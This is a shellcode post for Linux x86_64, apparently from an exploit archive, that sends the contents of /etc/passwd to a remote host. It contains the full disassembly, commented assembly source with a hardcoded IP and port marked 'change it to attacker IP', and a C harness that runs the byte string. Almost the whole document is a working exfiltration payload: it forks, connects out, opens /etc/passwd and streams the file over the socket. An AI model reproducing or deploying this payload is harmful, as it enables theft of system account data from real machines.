/*
    # Title : Linux x86_64 /etc/passwd file sender shellcode
    # Date : 28-06-2016
    # Author : Roziul Hasan Khan Shifat
    # Tested On : Ubuntu 14.04 LTS x86_64
*/


/*

Disassembly of section .text:

0000000000400080 <_start>:
  400080:	48 31 c0             	xor    %rax,%rax
  400083:	b0 39                	mov    $0x39,%al
  400085:	0f 05                	syscall
  400087:	99                   	cltd
  400088:	48 39 d0             	cmp    %rdx,%rax
  40008b:	74 07                	je     400094 <send>
  40008d:	48 31 c0             	xor    %rax,%rax
  400090:	b0 3c                	mov    $0x3c,%al
  400092:	0f 05                	syscall

0000000000400094 <send>:
  400094:	b2 06                	mov    $0x6,%dl
  400096:	48 31 f6             	xor    %rsi,%rsi
  400099:	48 ff c6             	inc    %rsi
  40009c:	40 b7 02             	mov    $0x2,%dil
  40009f:	48 31 c0             	xor    %rax,%rax
  4000a2:	b0 29                	mov    $0x29,%al
  4000a4:	0f 05                	syscall
  4000a6:	4d 31 c0             	xor    %r8,%r8
  4000a9:	49 89 c0             	mov    %rax,%r8
  4000ac:	48 31 c0             	xor    %rax,%rax
  4000af:	99                   	cltd
  4000b0:	48 31 ff             	xor    %rdi,%rdi
  4000b3:	48 31 f6             	xor    %rsi,%rsi
  4000b6:	50                   	push   %rax
  4000b7:	50                   	push   %rax
  4000b8:	50                   	push   %rax
  4000b9:	c6 04 24 02          	movb   $0x2,(%rsp)
  4000bd:	66 c7 44 24 02 05 c0 	movw   $0xc005,0x2(%rsp)
  4000c4:	c7 44 24 04 c0 a8 56 	movl   $0x8056a8c0,0x4(%rsp)
  4000cb:	80
  4000cc:	48 89 e6             	mov    %rsp,%rsi
  4000cf:	b2 10                	mov    $0x10,%dl
  4000d1:	4c 89 c7             	mov    %r8,%rdi

00000000004000d4 <connect>:
  4000d4:	48 31 c0             	xor    %rax,%rax
  4000d7:	b0 2a                	mov    $0x2a,%al
  4000d9:	0f 05                	syscall
  4000db:	4d 31 c9             	xor    %r9,%r9
  4000de:	4c 39 c8             	cmp    %r9,%rax
  4000e1:	75 f1                	jne    4000d4 <connect>
  4000e3:	48 31 c0             	xor    %rax,%rax
  4000e6:	48 31 f6             	xor    %rsi,%rsi
  4000e9:	50                   	push   %rax
  4000ea:	50                   	push   %rax
  4000eb:	50                   	push   %rax
  4000ec:	c7 04 24 2f 65 74 63 	movl   $0x6374652f,(%rsp)
  4000f3:	c7 44 24 04 2f 2f 70 	movl   $0x61702f2f,0x4(%rsp)
  4000fa:	61
  4000fb:	c7 44 24 08 73 73 77 	movl   $0x64777373,0x8(%rsp)
  400102:	64
  400103:	48 89 e7             	mov    %rsp,%rdi
  400106:	b0 02                	mov    $0x2,%al
  400108:	0f 05                	syscall
  40010a:	48 89 c6             	mov    %rax,%rsi
  40010d:	4c 89 c7             	mov    %r8,%rdi
  400110:	99                   	cltd
  400111:	66 41 ba 88 13       	mov    $0x1388,%r10w
  400116:	48 31 c0             	xor    %rax,%rax
  400119:	b0 28                	mov    $0x28,%al
  40011b:	0f 05                	syscall
  40011d:	48 31 c0             	xor    %rax,%rax
  400120:	b0 3c                	mov    $0x3c,%al
  400122:	0f 05                	syscall

*/


/*

section .text
	global _start
_start:

xor rax,rax
mov al,57
syscall

cdq
cmp rax,rdx
jz send

xor rax,rax
mov al,60
syscall

send:
;----------------
;connecting to server
;-------------------------

;creating socket


mov dl,6
xor rsi,rsi
inc rsi
mov dil,2


xor rax,rax
mov al,41
syscall

;---------------------
xor r8,r8
mov r8,rax ;socket descriptor

;----------------------------
;connecting.............

;struct sockaddr_in 16 bytes
;sin_family 2 bytes
;sin_port 2 bytes
;sin_addr 4 bytes


xor rax,rax
cdq
xor rdi,rdi
xor rsi,rsi


push rax
push rax
push rax

mov [rsp],byte 2
mov [rsp+2],word 0xc005 ;port 1472 (change it if U want)
mov [rsp+4],dword 0x8056a8c0 ;change it to attacker IP

mov rsi,rsp

mov dl,16

mov rdi,r8

connect:
xor rax,rax
mov al,42
syscall

xor r9,r9
cmp rax,r9
jnz connect

;------------------------------
;opennig /etc/passwd

xor rax,rax
xor rsi,rsi

push rax
push rax
push rax

mov [rsp],dword '/etc'
mov [rsp+4],dword '//pa'
mov [rsp+8],dword 'sswd'

mov rdi,rsp

mov al,2
syscall
;----------------------



;sending...............
mov rsi,rax ;in_fd
mov rdi,r8 ;out_fd
cdq
mov r10w,5000
xor rax,rax
mov al,40
syscall
;--------------

;exiting

xor rax,rax
mov al,60
syscall

*/


#include<stdio.h>
#include<string.h>

char shellcode[]="\x48\x31\xc0\xb0\x39\x0f\x05\x99\x48\x39\xd0\x74\x07\x48\x31\xc0\xb0\x3c\x0f\x05\xb2\x06\x48\x31\xf6\x48\xff\xc6\x40\xb7\x02\x48\x31\xc0\xb0\x29\x0f\x05\x4d\x31\xc0\x49\x89\xc0\x48\x31\xc0\x99\x48\x31\xff\x48\x31\xf6\x50\x50\x50\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x05\xc0\xc7\x44\x24\x04\xc0\xa8\x56\x80\x48\x89\xe6\xb2\x10\x4c\x89\xc7\x48\x31\xc0\xb0\x2a\x0f\x05\x4d\x31\xc9\x4c\x39\xc8\x75\xf1\x48\x31\xc0\x48\x31\xf6\x50\x50\x50\xc7\x04\x24\x2f\x65\x74\x63\xc7\x44\x24\x04\x2f\x2f\x70\x61\xc7\x44\x24\x08\x73\x73\x77\x64\x48\x89\xe7\xb0\x02\x0f\x05\x48\x89\xc6\x4c\x89\xc7\x99\x66\x41\xba\x88\x13\x48\x31\xc0\xb0\x28\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05";

main()
{
printf("shellcode length %ld\n",(long)strlen(shellcode));
(* (int(*)()) shellcode) ();
}